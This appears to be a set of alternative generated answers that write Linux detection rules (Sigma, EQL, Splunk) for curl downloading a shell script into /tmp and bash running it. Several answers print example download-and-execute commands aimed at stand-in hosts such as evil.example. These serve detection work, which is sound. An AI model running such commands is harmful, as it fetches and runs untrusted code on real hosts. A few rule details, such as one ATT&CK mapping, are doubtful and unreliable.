Use this only in a controlled lab environment:

```bash
curl -o /tmp/test_download_execute.sh file:///tmp/test_download_execute.sh
bash /tmp/test_download_execute.sh
```

Or, if network testing is allowed:

```bash
curl -o /tmp/test_download_execute.sh https://example.invalid/test_download_execute.sh
bash /tmp/test_download_execute.sh
```

The rule should alert because:

text:
Below is a practical detection rule for the described Linux pattern:

> `curl` downloads/writes a `*.sh` script to `/tmp`, then `bash`/`sh` executes that script.

This is a classic **download-and-execute** malware delivery pattern, often mapping to:

- **MITRE ATT&CK T1105 – Ingress Tool Transfer**
- **MITRE ATT&CK T1059.004 – Command and Scripting Interpreter: Unix Shell**

Because this involves two related events, the cleanest implementation is a **temporal correlation rule**. I recommend Sigma because it is portable to many SIEM/EDR platforms.

---

## Recommended Sigma rule

```yaml
title: Malicious Download and Execution of Bash Script from /tmp via curl
id: 1e8f6c6b-9f8d-4a2e-97d9-1d1a1f82e4f1
status: experimental
description: >
  Detects curl downloading or writing a *.sh or *.bash script to /tmp
  followed by bash or sh execution of that script on the same host.
  This pattern is commonly associated with malware delivery and remote script execution.
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1105/
author: security-assistant
date: 2026-02-03
tags:
  - attack.execution
  - attack.command-and-control
  - attack.t1059.004
  - attack.t1105
logsource:
  product: linux
  service: process_creation
  definition: >
    Requires process creation telemetry containing the process image path
    and full command line, plus a reliable host identifier.
detection:
  # Stage 1: curl writes or downloads a shell script into /tmp
  selection_curl_image:
    Image|endswith:
      - '/curl'
      - '/usr/bin/curl'
      - '/usr/local/bin/curl'
      - '/bin/curl'

  selection_curl_targets_tmp_script:
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  selection_curl_output_write_indicators:
    CommandLine|re: '(?i)(?:-o|--output)(?:=|\s+)(?:"|\')?[^\\s"\']*?/tmp/[^\\s"\']*\\.(?:sh|bash)(?:"|\')?|>>?\\s*(?:"|\')?[^\\s"\']*?/tmp/[^\\s"\']*\\.(?:sh|bash)(?:"|\')?'

  curl_download_event:
    condition: selection_curl_image and selection_curl_targets_tmp_script and selection_curl_output_write_indicators

  # Stage 2: bash or sh executes a script located in /tmp
  selection_bash_execution_image:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/usr/bin/bash'
      - '/usr/bin/sh'
      - '/usr/local/bin/bash'

  selection_bash_execution_tmp_script:
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  bash_execute_event:
    condition: selection_bash_execution_image and selection_bash_execution_tmp_script

  condition: curl_download_event and bash_execute_event

correlation:
  type: temporal
  rules:
    - curl_download_event
    - bash_execute_event
  timeframe: 5m
  group-by:
    - Hostname
    # If your log source uses a different host field, replace Hostname with:
    # Computer, host.name, node, agent.hostname, etc.

falsepositives:
  - Legitimate software installers or update scripts downloading helper scripts to /tmp
  - CI/CD pipelines that fetch maintenance scripts during deployment
  - Administrative scripts that download and run helper scripts from /tmp

level: high
```

---

## If your platform does not support Sigma correlation

Deploy the two stages as separate event rules and correlate them by host within **5 minutes**.

### Rule 1: `curl` writes a `.sh` file to `/tmp`

```yaml
title: curl Writes Bash Script to /tmp
status: experimental
logsource:
  product: linux
  service: process_creation
detection:
  selection_curl_image:
    Image|endswith:
      - '/curl'

  selection_curl_tmp_script:
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  selection_curl_write_indicators:
    CommandLine|re: '(?i)(?:-o|--output)(?:=|\s+)(?:"|\')?[^\\s"\']*?/tmp/[^\\s"\']*\\.(?:sh|bash)(?:"|\')?|>>?\\s*(?:"|\')?[^\\s"\']*?/tmp/[^\\s"\']*\\.(?:sh|bash)(?:"|\')?'

  condition: selection_curl_image and selection_curl_tmp_script and selection_curl_write_indicators

level: medium
```

### Rule 2: `bash` or `sh` executes a `.sh` script from `/tmp`

```yaml
title: bash Executes Shell Script from /tmp
status: experimental
logsource:
  product: linux
  service: process_creation
detection:
  selection_execution_image:
    Image|endswith:
      - '/bash'
      - '/sh'

  selection_execution_tmp_script:
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  condition: selection_execution_image and selection_execution_tmp_script

level: medium
```

### Correlation logic
Alert when:

```text
Rule 1 occurs first
Rule 2 occurs second
Same host
Time difference <= 5 minutes
```

---

## Field name adaptation notes

Depending on your telemetry source, adjust these common fields:

- **Host:** `Hostname`, `Computer`, `host.name`, `node`, `agent.hostname`
- **Process image:** `Image`, `process.name`, `exe`, `comm`
- **Command line:** `CommandLine`, `process.args`, `cmdline`

For **Sysmon for Linux**, the example fields `Image` and `CommandLine` are a good fit.

For **Auditd / OSQuery / eBPF sources**, map to:

```text
Image         -> exe or path
CommandLine   -> args or cmdline
Hostname      -> host, node, or agent identifier
```

---

## Tuning recommendations

This rule can produce false positives in environments where administrators or software installers legitimately download scripts to `/tmp` and execute them. To improve fidelity:

1. **Add allowlists** for known-good:
   - Package managers
   - CI/CD runners
   - Vendor installers
   - Signed binaries

2. **Prefer exact `/tmp/.../...sh` paths** if your EDR supports process arguments more reliably than full `CommandLine`.

3. **Add file creation events if available**:
   If your telemetry supports `file_write`, correlate:
   - `curl` creating `/tmp/.../...sh`
   - followed by `bash`/`sh` executing that exact path  
   This reduces false positives significantly.

4. **Shorten the correlation window** if your environment produces noisy legitimate scripts.  
   A window of **30 seconds to 2 minutes** often works better than 5 minutes for fast malware execution.

---

## Example of what this detects

### Download
```bash
curl -o /tmp/evil.sh http://malicious.example/evil.sh
```
then execute:
```bash
bash /tmp/evil.sh
```

or:
```bash
curl http://malicious.example/evil.sh > /tmp/evil.sh
sh /tmp/evil.sh
```

or:
```bash
curl --output /tmp/evil.sh http://malicious.example/evil.sh
/usr/bin/bash /tmp/evil.sh
```

All of these match the intended detection objective.

text:
## Detection Objective

Detect Linux process behavior where `curl` downloads a Bash script into `/tmp`, then that script is executed by `bash`, or by direct shebang execution of a `/tmp/*.sh` file. This is a common malware delivery pattern:

```bash
curl http://evil.example/payload.sh -o /tmp/payload.sh
bash /tmp/payload.sh
```

or:

```bash
curl http://evil.example/payload.sh -o /tmp/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
```

or a one-liner:

```bash
bash -c "curl http://evil.example/payload.sh -o /tmp/payload.sh && bash /tmp/payload.sh"
```

---

## Option 1: Elastic EQL Sequence Rule

This is the most direct rule format because it explicitly models the sequence:

`curl download → bash/script execution`

```eql
sequence by host.name with maxspan=5m
  [
    process where
      event.category: "process"
      and event.action: ("process_start", "process_created")
      and (
        process.name: "curl"
        or process.executable: "*/bin/curl"
        or process.executable: "*/usr/bin/curl"
      )
      and (
        // Typical: curl URL -o /tmp/file.sh
        (
          process.args: ("-o", "--output")
          and process.args: ("/tmp/*.sh", "/tmp/*.bash")
        )
        // Also catch full command-line variants
        or process.command_line: (
          "* -o /tmp/*.sh*",
          "* --output /tmp/*.sh*",
          "*--output=/tmp/*.sh*",
          "* -o /tmp/*.bash*",
          "* --output /tmp/*.bash*"
        )
      )
  ] as curl_download

  [
    process where
      event.category: "process"
      and event.action: ("process_start", "process_created")
      and (
        // Execution by bash: bash /tmp/payload.sh
        (
          process.name: (
            "bash",
            "/bin/bash",
            "/usr/bin/bash",
            "/usr/local/bin/bash"
          )
          and (
            process.args: ("/tmp/*.sh", "/tmp/*.bash")
            or process.command_line: ("* /tmp/*.sh*", "* /tmp/*.bash*")
          )
        )
        // Direct shebang execution: /tmp/payload.sh
        or process.executable: ("/tmp/*.sh", "/tmp/*.bash")
      )
  ] as script_execution
```

### Notes for EQL

- If your environment records different fields, map the following fields accordingly:
  - `event.action`
  - `process.name`
  - `process.executable`
  - `process.args`
  - `process.command_line`
- The sequence is correlated by `host.name`.
- The `maxspan=5m` can be adjusted. Shorter windows reduce false positives; longer windows may catch delayed execution.

---

## Option 2: Sigma Rule — Sequence/Correlation Format

Use this if your SIEM supports sequence correlation or Sigma 1.x correlation features.

```yaml
title: Curl Downloads Bash Script to /tmp Followed by Execution
id: 9d1f6f9c-9d1e-4d1d-9f22-3f6f8c1b7e12
status: experimental
description: >
  Detects curl writing a bash script into /tmp followed by execution of that
  script by bash or direct shebang execution. This behavior is commonly seen in
  malware and dropper activity.
author: Detection Engineering
date: 2026-06-15
references: []
tags:
  - attack.command_and_control
  - attack.execution
  - attack.t1059
  - attack.t1105

logsource:
  product: linux
  category: process_creation

detection:
  selection_curl_download:
    ProcessName:
      - "curl"
      - "/usr/bin/curl"
      - "/bin/curl"
    CommandLine|re: >
      (?i)curl\b.*(?:-o|--output)(?:\s+|=)\s*(/tmp/[^;|&\s]+\.(?:sh|bash))(?:\s|;|\||&|$)

  selection_execute_bash:
    ProcessName:
      - "bash"
      - "/bin/bash"
      - "/usr/bin/bash"
      - "/usr/local/bin/bash"
    CommandLine|re: >
      (?i)(?:bash|/bin/bash|/usr/bin/bash|/usr/local/bin/bash)(?:\s+[^\s;|&]+)*\s(/tmp/[^;|&\s]+\.(?:sh|bash))(?:\s|;|\||&|$)

  selection_execute_script_image:
    Image|re: >
      ^/tmp/[^/]+\.(?:sh|bash)$

  selection_execution:
    selection_execute_bash or selection_execute_script_image

  selection_chain_single_command:
    ProcessName:
      - "bash"
      - "/bin/bash"
      - "sh"
      - "/bin/sh"
    CommandLine|re: >
      (?i)curl\b.*(?:-o|--output)(?:\s+|=)\s*(/tmp/[^;|&\s]+\.(?:sh|bash)).*?(?:&&|;|\|).*?(?:bash\s+)?(/tmp/[^;|&\s]+\.(?:sh|bash))

  condition: |
    selection_chain_single_command
    or
    selection_curl_download followed by selection_execution
    within 5 minutes, grouped by host

falsepositives:
  - Legitimate software installers that download helper scripts into /tmp and execute them.
  - Build tooling, container startup scripts, or provisioning scripts.
  - Curl used as a connectivity test with local or trusted script files.

level: high
```

---

## Option 3: Sigma Rules for Tools Without Native Correlation

If your SIEM or Sigma backend does not support `followed by` correlation, deploy these as two rules and correlate manually.

### Rule A — `curl` Downloads Bash Script to `/tmp`

```yaml
title: Curl Downloads Bash Script to /tmp
status: experimental
description: >
  Detects curl writing a .sh or .bash script into /tmp.
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    ProcessName:
      - "curl"
      - "/usr/bin/curl"
      - "/bin/curl"
    CommandLine|re: >
      (?i)curl\b.*(?:-o|--output)(?:\s+|=)\s*(/tmp/[^;|&\s]+\.(?:sh|bash))(?:\s|;|\||&|$)
  condition: 1
falsepositives:
  - Legitimate installers and provisioning scripts.
level: medium
tags:
  - attack.t1105
```

### Rule B — Bash Executes Script From `/tmp`

```yaml
title: Bash Executes Script From /tmp
status: experimental
description: >
  Detects bash executing a script from /tmp or direct execution of a /tmp script file.
logsource:
  product: linux
  category: process_creation
detection:
  selection_bash:
    ProcessName:
      - "bash"
      - "/bin/bash"
      - "/usr/bin/bash"
      - "/usr/local/bin/bash"
    CommandLine|re: >
      (?i)(?:bash|/bin/bash|/usr/bin/bash|/usr/local/bin/bash)(?:\s+[^\s;|&]+)*\s(/tmp/[^;|&\s]+\.(?:sh|bash))(?:\s|;|\||&|$)

  selection_script_image:
    Image|re: >
      ^/tmp/[^/]+\.(?:sh|bash)$

  condition: selection_bash or selection_script_image
falsepositives:
  - Legitimate scripts copied to /tmp and executed by administrators or installers.
level: medium
tags:
  - attack.t1059
```

### Correlation Logic

For a high-confidence alert:

```text
Rule B event occurred
AND within the previous 5 minutes
AND on the same host
Rule A occurred
AND the filename/path from Rule A matches the filename/path from Rule B
```

Example:

```text
Rule A:
  curl http://example.com/payload.sh -o /tmp/payload.sh

Rule B:
  bash /tmp/payload.sh

Result:
  High-confidence download-and-execute detection.
```

---

## Optional Tuning / Allow-List Guidance

To reduce false positives, consider allowing only known benign parents, installers, or automation frameworks. Examples:

```yaml
filter_benign:
  ParentProcessName:
    - "apt-get"
    - "dpkg"
    - "dnf"
    - "yum"
    - "snap"
    - "systemd"
  ParentCommandLine|contains:
    - "/usr/lib/apt/"
    - "/usr/lib/dpkg/"
    - "/usr/libexec/redis-serve-configurator"
    - "/usr/bin/apt-key"
    - "/usr/bin/cloud-init"
    - "/usr/bin/useradd"
    - "/usr/bin/groupadd"
```

Then adjust the detection condition to exclude filtered events.

---

## Suggested Alert Fields

When implementing the rule, alert on:

```text
event_id
timestamp
host_name
hostname
user_name
process_name
process_id
process_guid
parent_process_name
parent_process_id
command_line
process_executable
process_args
process_parent_command_line
event.action
event.category
```

This makes the alert useful for confirming both:

1. The `curl` download event.
2. The subsequent `bash` or script execution event.

text:
Below is a practical detection rule set for **Linux** environments where the goal is to catch a classic download-and-execute pattern:

> **`curl` writes a bash script to `/tmp/...*.sh`, then `bash` executes that script.**

This is best implemented as a **two-event correlation/sequence rule**, not as a single log lookup, because the suspicious behavior spans **file creation** and **process execution**.

---

## 1) MITRE ATT&CK Mapping

- **T1059.004 – Command and Scripting Interpreter: Unix Shell**
- **T1105 – Ingress Tool Transfer**
- Often also associated with:
  - **T1027 – Obfuscated Files or Information**
  - **T1071 – Application Layer Protocol**

---

## 2) High-Level Detection Logic

### Event A — Download/write event
Detect a file-write event where:
- process image ends with `/curl`
- target file path starts with `/tmp/`
- target file path ends with `.sh`

### Event B — Execution event
Detect a process-create event where:
- process image is `/bin/bash` or `/usr/bin/bash`
- command line contains an executable path under `/tmp/` ending in `.sh`

### Correlation requirements
- Same host
- Same user if available
- Execution happens **after** file write
- Usually within **30–60 seconds**
- Optional but strongly recommended: correlate by **exact file path**

---

## 3) Sigma-Style Detection Rules

> Note: Sigma correlation support varies by SIEM/EDR. The cleanest approach is to use the two rules below and enable sequence correlation in your platform.

### Rule 1 — Curl Writes Bash Script To `/tmp`

```yaml
title: Curl Writes Bash Script To /tmp
id: 67f2a6e0-6b3d-4d34-8974-8f8b7b2b5354
status: experimental
description: |
  Detects file-write events where curl creates a bash script under /tmp.
  This is commonly seen when attackers download payloads to world-writable temp directories.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
author: Security Operations
logsource:
  product: linux
  category: file_write
detection:
  selection:
    Image|endswith:
      - '/curl'
    TargetFilename|startswith:
      - '/tmp/'
    TargetFilename|endswith:
      - '.sh'
  condition: selection
falsepositives:
  - Software installers
  - Package manager scripts
  - Legitimate automation that stages scripts in /tmp
level: medium
tags:
  - attack.t1105
  - attack.t1059.004
```

---

### Rule 2 — Bash Executes Script From `/tmp`

```yaml
title: Bash Executes Bash Script From /tmp
id: 93d7927f-2c1a-417c-8551-271f15f7f55b
status: experimental
description: |
  Detects bash execution of a script located under /tmp.
  This is suspicious when correlated with a recent download, especially from curl or wget.
references:
  - https://attack.mitre.org/techniques/T1059.004/
  - https://attack.mitre.org/techniques/T1105/
author: Security Operations
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith:
      - '/bin/bash'
      - '/usr/bin/bash'
    CommandLine|re: '(?i)/tmp/[^\s]+\.sh'
  condition: selection
falsepositives:
  - Legitimate post-install scripts
  - Build agents or CI systems using /tmp
  - Admin scripts
level: medium
tags:
  - attack.t1059.004
```

---

## 4) Correlation Rule (SIEM-Agnostic Pseudocode)

```yaml
title: Curl Downloads Bash Script To /tmp Followed by Bash Execution
description: |
  Detects a curl process writing a .sh file to /tmp, followed by bash executing that file.
group_by:
  - host
  - user
optional_group_by:
  - target_file_path
timeframe: 30s
sequence:
  - rule: Curl Writes Bash Script To /tmp
    timestamp_field: EventTime
  - rule: Bash Executes Bash Script From /tmp
    timestamp_field: EventTime
condition:
  - execution.timestamp > download.timestamp
  - execution.timestamp - download.timestamp <= 30s
  - optional: execution.script_path == download.target_filename
output:
  severity: high
  summary: Potential download-and-execute activity: curl wrote /tmp/*.sh, then bash executed it
```

---

## 5) Direct Splunk Implementation

This example assumes Linux Sysmon/audit events where:
- `EventCode=11` = file write
- `EventCode=1` = process creation

Adapt field names (`host`, `user`, `Image`, `TargetFilename`, `CommandLine`) to your environment.

```spl
index=sysmon EventCode IN (1,11)
| where 
    (
      EventCode=11 
      AND match(Image,"/curl$")
      AND match(TargetFilename,"^/tmp/.*\\.sh$")
    )
    OR 
    (
      EventCode=1
      AND match(Image,"/(bin/bash|usr/bin/bash)$")
      AND match(CommandLine,"(/tmp/[^ ]+\\.sh)")
    )

| rex field=CommandLine "(?<exec_path>/tmp/[^\\s]+\\.sh)"
| eval target_path=coalesce(TargetFilename, exec_path)
| where target_path IS NOT NULL

| eval download_time=if(EventCode=11,_time,null())
| eval exec_time=if(EventCode=1,_time,null())

| stats 
    min(download_time) as first_download_time,
    max(exec_time) as last_exec_time,
    count(download_time) as download_events,
    count(exec_time) as exec_events
  by host,user,target_path

| where download_events >= 1
       AND exec_events >= 1
       AND last_exec_time > first_download_time
       AND (last_exec_time - first_download_time) <= 60

| table host,user,target_path,first_download_time,last_exec_time
```

### Splunk tuning notes
- Change `60` to `30` seconds for lower false positives.
- If `host` and `user` are named differently, use `Computer` / `Account` or your equivalents.
- For more precision, require the downloaded path to appear exactly in the bash command line.

---

## 6) If File-Write Logs Are Not Available

If your environment only provides **process creation** events, you can still implement a useful correlation using command line patterns.

### Fallback Rule 1 — Curl Attempts To Write `/tmp` Script via Command Line

```yaml
title: Curl Attempts Bash Script Download To /tmp
id: 42c5a792-71b3-46d0-823d-62d37535679b
status: experimental
description: |
  Detects curl command lines likely writing a bash script to /tmp.
author: Security Operations
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059.004/
logsource:
  product: linux
  category: process_creation
detection:
  selection_output_flag:
    Image|endswith:
      - '/curl'
    CommandLine|re: '(?i)curl\b.*(?:-o|--output)\s+/tmp/[^\s]+\.sh'
  selection_redirect:
    Image|endswith:
      - '/curl'
    CommandLine|re: '(?i)curl\b.*>\s+/tmp/[^\s]+\.sh'
  condition: selection_output_flag or selection_redirect
falsepositives:
  - Legitimate remote script installation
level: medium
tags:
  - attack.t1105
  - attack.t1059.004
```

Then correlate that with the bash execution rule:

```yaml
title: Bash Executes /tmp Script
id: 5a73f0a2-1c23-418f-9e5e-f0d7c71f8f1b
status: experimental
description: |
  Detects bash executing scripts located under /tmp.
author: Security Operations
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith:
      - '/bin/bash'
      - '/usr/bin/bash'
    CommandLine|re: '(?i)/tmp/[^\s]+\.sh'
  condition: selection
falsepositives:
  - Build agents
  - CI/CD systems
  - Admin tooling
level: medium
```

Use the same correlation logic:
- same host/user
- execution after download
- within 30–60 seconds
- optional exact file path match

---

## 7) Optional Extensions

### 7.1 Include `wget` as well
If you want broader coverage for the same TTP:

```yaml
Image|endswith:
  - '/curl'
  - '/wget'
```

or in command-line rules:

```yaml
Image|endswith:
  - '/curl'
  - '/wget'
```

### 7.2 Detect direct `curl | bash`
The core objective focuses on **download-to-disk, then execute**, but this TTP is also commonly seen with streaming execution.

A lightweight process-only variant:

```yaml
title: Bash Executes Script Piped From Curl
id: 6c338a7b-3c9c-4708-8f77-a42f1b9f6d5c
status: experimental
description: |
  Detects bash processes whose command line suggests execution of a script fetched via curl.
author: Security Operations
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith:
      - '/bin/bash'
      - '/usr/bin/bash'
    CommandLine|re: '(?i)curl\s+.+http.*\|\s*(?:/bin/bash|bash)'
  condition: selection
falsepositives:
  - Legitimate installers
  - Developer tools
level: medium
tags:
  - attack.t1059.004
  - attack.t1105
```

### 7.3 Include `sh` for broader Unix shell coverage
If you want to expand detection beyond bash:

```yaml
Image|endswith:
  - '/bin/bash'
  - '/usr/bin/bash'
  - '/bin/sh'
  - '/usr/bin/sh'
```

This will increase false positives, so tune carefully.

---

## 8) False Positive Considerations

Common benign sources:
- software installers using `/tmp`
- package managers
- update agents
- CI/CD runners
- admin automation
- developer tools downloading and running scripts

### Good ways to reduce noise
1. **Use exact file-path correlation** when available.
2. **Shorten the window** to 30 seconds if feasible.
3. **Exclude trusted directories** used by package managers or installers if your tooling supports it.
4. **Require `curl` to originate from suspicious parent processes** when available, such as:
   - web server processes
   - office applications
   - shells spawned from unusual chains
5. **Add allowlists by path/hash** for known enterprise automation.

---

## 9) Recommended Production Rule

If you can only deploy one rule, make it a **correlated sequence**:

### Name
**`Curl Downloads Bash Script To /tmp Followed by Bash Execution`**

### Event source requirements
- Linux process creation
- Linux file write

### Correlation key
- `host`
- `user`
- `target_file_path` if available

### Time window
- 30 seconds preferred
- 60 seconds acceptable

### Severity
- **High** when exact path correlation succeeds
- **Medium** if only host/user/time correlation is available

### Why this works
The rule matches an attacker’s common staging method:
- fetch payload from remote infrastructure
- write it to a writable directory
- execute it via a standard system interpreter

That makes it a solid general-purpose detection for **download-and-execute malware delivery**.

text:
Below is a practical detection rule for Linux download-and-execute behavior. Because the objective says **“followed by”**, the behavior spans two events, so the best implementation is a **temporal/correlation rule**. I am providing both an **Elastic EQL sequence rule** and the equivalent **SIEM correlation selections** you can use if your platform is Sigma-based.

## Core logic

Detect when all of the following occur:

1. A `curl` process creates/downloads a script into `/tmp/` with a `.sh` extension, for example:
   - `curl ... -o /tmp/payload.sh`
   - `curl ... --output /tmp/payload.sh`
   - `curl ... --output-dir /tmp ... .sh`
2. A `bash` or `sh` process later executes a `.sh` file from `/tmp/`, for example:
   - `bash /tmp/payload.sh`
   - `sh /tmp/payload.sh`
   - `/tmp/payload.sh`
3. Both events occur on the same host within a short time window, such as 5 to 30 minutes.

---

## Recommended rule: Elastic EQL sequence rule

This assumes ECS-style endpoint telemetry with Linux process start events. Adjust field names if your source uses Sysmon, auditd, eBPF, or another provider.

```eql
sequence by host.name with maxspan=5m
  [process where event.category == "process" and event.action == "start"
    and (
      process.name == "curl"
      or process.executable in ("/usr/bin/curl", "/bin/curl", "/usr/local/bin/curl")
    )
    and (
      (
        process.args == "-o"
        and process.args == "/tmp/*.sh*"
      )
      or (
        process.args == "--output"
        and process.args == "/tmp/*.sh*"
      )
      or process.args == "-o=/tmp/*.sh*"
      or process.args == "--output=/tmp/*.sh*"
      or (
        process.args == "--output-dir"
        and process.args == "/tmp*"
        and process.args == "*.sh*"
      )
      or process.command_line == "*-o /tmp/*.sh*"
      or process.command_line == "*-o* /tmp/*.sh*"
      or process.command_line == "*--output /tmp/*.sh*"
      or process.command_line == "*--output=/tmp/*.sh*"
      or process.command_line == "*> /tmp/*.sh*"
    )
  ]
  [process where event.category == "process" and event.action == "start"
    and (
      process.name in ("bash", "sh")
      or process.executable in (
        "/bin/bash",
        "/usr/bin/bash",
        "/bin/sh",
        "/usr/bin/sh",
        "/usr/local/bin/bash",
        "/usr/local/bin/sh"
      )
      or process.executable == "/tmp/*.sh"
      or process.name == "*.sh"
    )
    and (
      process.args == "/tmp/*.sh*"
      or process.command_line == "*bash /tmp/*.sh*"
      or process.command_line == "*sh /tmp/*.sh*"
      or process.command_line == "/tmp/*.sh*"
      or process.command_line == "* /tmp/*.sh*"
    )
  ]
```

---

## Stronger variant using file creation events

If your endpoint telemetry includes file events, correlate a `curl` write to `/tmp/*.sh` with later `bash` execution. This reduces false positives from command-line parsing quirks.

```eql
sequence by host.name with maxspan=5m
  [file where event.category == "file"
    and event.action in ("creation", "write", "modify")
    and file.path == "/tmp/*.sh"
    and (
      process.name == "curl"
      or process.executable in ("/usr/bin/curl", "/bin/curl", "/usr/local/bin/curl")
    )
  ]
  [process where event.category == "process" and event.action == "start"
    and (
      process.name in ("bash", "sh")
      or process.executable in ("/bin/bash", "/usr/bin/bash", "/bin/sh", "/usr/bin/sh")
    )
    and (
      process.args == "/tmp/*.sh*"
      or process.command_line == "* /tmp/*.sh*"
      or process.command_line == "/tmp/*.sh*"
    )
  ]
```

---

## Sigma-style correlation selections

Sigma is not ideal for expressing “event A followed by event B” directly. The clean approach is to create two selections and let your SIEM correlate them temporally.

### Selection 1: `curl` downloads a script into `/tmp`

```yaml
title: Curl Downloads Bash Script to /tmp
description: >
  Detects curl processes that appear to download or write shell scripts
  into /tmp. Use this event as the parent/indicator for correlated
  execution detection.
status: experimental
references:
  - https://attack.mitre.org/techniques/T1105/
logsource:
  product: linux
  category: process_creation
detection:
  selection_output_short:
    Image|endswith:
      - '/curl'
    CommandLine|contains|all:
      - '-o /tmp/'
      - '.sh'

  selection_output_long:
    Image|endswith:
      - '/curl'
    CommandLine|contains|all:
      - '--output /tmp/'
      - '.sh'

  selection_output_equals:
    Image|endswith:
      - '/curl'
    CommandLine|contains|all:
      - '--output=/tmp/'
      - '.sh'

  selection_output_dir:
    Image|endswith:
      - '/curl'
    CommandLine|contains|all:
      - '--output-dir /tmp'
      - '.sh'

  condition: selection_output_short or selection_output_long or selection_output_equals or selection_output_dir

falsepositives:
  - Legitimate installer scripts that download files into /tmp
level: medium
```

### Selection 2: `bash` or `sh` executes a script from `/tmp`

```yaml
title: Bash or Sh Executes Script From /tmp
description: >
  Detects execution of shell scripts located in /tmp by bash or sh.
  When correlated with curl download events, this detects classic
  download-and-execute malware delivery.
status: experimental
references:
  - https://attack.mitre.org/techniques/T1059/004/
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  filter:
    ParentImage|endswith:
      - '/apt-get'
      - '/dpkg'
      - '/dnf'
      - '/yum'
      - '/rpm'
      - '/snap'
      - '/systemd'
      - '/git'
      - '/make'

  condition: selection and not filter

falsepositives:
  - Software installers
  - Cloud-init scripts
  - Developer tooling
  - Package manager hooks
level: high
```

### SIEM correlation configuration

Use the two selections above as:

```text
Event A: selection_download
Event B: selection_execution

Condition:
  selection_download followed by selection_execution
  within 5 to 30 minutes
  grouped by host
```

---

## Examples that should trigger this behavior

These are representative malicious or high-risk patterns:

```bash
curl http://malicious.example/payload -o /tmp/payload.sh
bash /tmp/payload.sh
```

```bash
curl --output /tmp/stage2.sh https://evil.example/stage2.sh
/tmp/stage2.sh
```

```bash
curl https://evil.example/install -o /tmp/patch.sh
sh /tmp/patch.sh
```

```bash
curl https://evil.example/file --output-dir /tmp
bash /tmp/file.sh
```

---

## Tuning guidance

This rule is high confidence for malware delivery but may fire on legitimate installers. Consider suppressing or downgrading alerts where:

- The parent process is a known package manager or installer.
- The network destination is a known trusted domain.
- The script is signed or known-good.
- The same behavior occurs repeatedly from deployment automation.

Useful suppression candidates:

```bash
curl -o /tmp/install.sh https://trusted.example/install.sh
bash /tmp/install.sh
```

If this is from a deployment system, add an allowlist for trusted download hosts, known script hashes, or trusted parent processes.

---

## MITRE ATT&CK mapping

This behavior maps to:

- **T1105 – Ingress Tool Transfer**
- **T1059.004 – Command and Scripting Interpreter: Unix Shell**
- **T1036.006 – Masquerading: Right-to-Left Override**, depending on filename usage
- **T1059 – Command and Scripting Interpreter**

The rule specifically detects the common Linux malware pattern:

```text
download to temp folder -> execute shell script
```

text:
Below is a practical detection rule for the stated objective. It assumes Linux process-creation logs from Sysmon/EDR/auditd. If your platform uses ECS fields, replace `Image` with `process.name` or `process.path`, and `CommandLine` with `process.args` or `process.command_line`.

## Sigma-style correlation rule

This is written as a temporal correlation rule: detect a `curl` process writing/downloading a `.sh` file under `/tmp`, then detect `bash` executing a `.sh` file from `/tmp` shortly afterward.

```yaml
title: Malicious File Download and Execution via Curl and Bash
description: >
  Detects a curl process downloading or writing a bash script to /tmp,
  followed by bash execution of that script, which is a common
  download-and-execute malware delivery pattern.
status: experimental
author: detection-engineering
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
tags:
  - attack.execution
  - attack.command_and_control
  - attack.t1059.004
  - attack.t1105

logsource:
  category: process_creation
  product: linux

detection:
  # Phase 1: curl downloads/writes a bash script into /tmp
  curl_download:
    Image|endswith:
      - '/curl'
    CommandLine|contains|all:
      - 'curl'
      - '/tmp/'
      - '.sh'
    CommandLine|re: "(?i)(?:^|[\\s\"'])(?:-o|--output|--output-dir)[ =]+[^\\s\"']*\\.sh\\b"

  # Phase 2: bash explicitly executes a script from /tmp
  bash_execute:
    Image|endswith:
      - '/bash'
    CommandLine|re: "(?i)(?:/bin/|/usr/bin/)?bash(?:\\s+[-\\w]+)*\\s+[\"']?/tmp/[^\\s\"']*\\.sh\\b"

  # Alternative Phase 2: script executes directly from /tmp via shebang
  script_execute:
    Image|startswith:
      - '/tmp/'
    Image|endswith:
      - '.sh'

  # Optional: catches one-command chains such as:
  # bash -c 'curl http://host/x.sh -o /tmp/x.sh && bash /tmp/x.sh'
  command_chain:
    Image|endswith:
      - '/bash'
      - '/sh'
    CommandLine|re: "(?i)curl[^\\n]*(?:-o|--output)[ =]+[^\\s\"']*\\.sh[^\\n]*(?:&&|\\||;)\\s*(?:/bin/)?(?:bash|sh)[^\\n]*\\.sh"

  # Correlation condition:
  # curl_download must be followed by either bash_execute or script_execute.
  # command_chain is a single-event variant of the same behavior.
  condition: >
    (curl_download and (bash_execute or script_execute))
    or command_chain

  timeframe: 30s

  # Correlate by host and session where available.
  # If your logging supports a session or audit session field, include it.
  group_by:
    - Hostname
    - SessionId
    - User

falsepositives:
  - Legitimate update/installer scripts using `curl -o /tmp/... .sh`
  - Package management or monitoring tooling
  - Developer operations running setup scripts from /tmp

level: high
```

### Implementation notes

- If your Sigma compiler or SIEM does **not** support multi-event correlation directly, split this into two atomic rules and correlate them:
  1. `curl_download`
  2. `bash_execute or script_execute`
- The strongest version would also compare the exact script path. For example, extract the `/tmp/...sh` path from the `curl` command line and require the `bash` execution event to reference the same path.

Path-extraction idea:

```text
script_path = regex_extract(
  curl_command_line,
  "(?i)(?:-o|--output|--output-dir)[ =]+(?:\"|')?(/tmp/[^\"']*.sh)"
)
```

Then alert only when:

```text
bash_command_line or bash_image contains script_path
```

text:
Below is a detection rule for Linux hosts that detects the classic **curl downloads a bash script into `/tmp` → bash executes it** pattern.

